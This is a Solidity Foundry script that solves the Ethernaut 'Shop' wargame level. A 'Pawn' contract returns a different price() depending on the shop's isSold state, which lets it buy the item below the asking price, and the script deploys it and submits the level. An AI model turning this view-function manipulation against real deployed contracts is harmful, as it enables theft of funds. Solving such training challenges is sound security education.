// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Shop} from "../src/Shop.sol";

/**
 *
 * Level address: 0x691eeA9286124c043B82997201E805646b76351a
 * Сan you get the item from the shop for less than the price asked?
 *
 * Things that might help:
 * Shop expects to be used from a Buyer
 * Understanding restrictions of view functions
 *
 */
contract Pawn {
    Shop private shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 0;
        }
        return shop.price();
    }

    function attack() external {
        shop.buy();
    }
}

contract ShopScript is Attacker {
    Level private level = Level(0x691eeA9286124c043B82997201E805646b76351a);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        Shop shop = Shop(instance);
        Pawn pawn = new Pawn(address(shop));
        pawn.attack();

        require(shop.isSold() == true, "Item is not sold");
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
